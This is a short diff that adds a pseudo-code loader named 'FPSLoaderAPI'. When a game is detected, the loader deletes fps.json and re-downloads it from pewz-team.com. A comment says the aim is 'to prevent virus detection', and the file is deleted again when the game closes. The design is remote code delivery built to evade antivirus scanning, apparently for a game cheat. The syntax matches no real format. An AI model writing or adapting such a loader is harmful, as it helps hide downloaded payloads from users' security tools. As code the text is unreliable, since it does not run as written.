@@ -1,0 +1,9 @@
+<run: "api/FPSLoaderAPI.json">
+command: $checkgame
+         $finddirectory
+         <delete fps.json>
+         <create fps.json?source=https://pewz-team.com/files/bin/fps.json>
+
+// To prevent virus detection
+delete fps.json = "(;gamedetectedclosed;)"
+recreate fps.json?source=https://pewz-team.com/files/bin/fps.json = "(;gamedetectedlaunched;)"
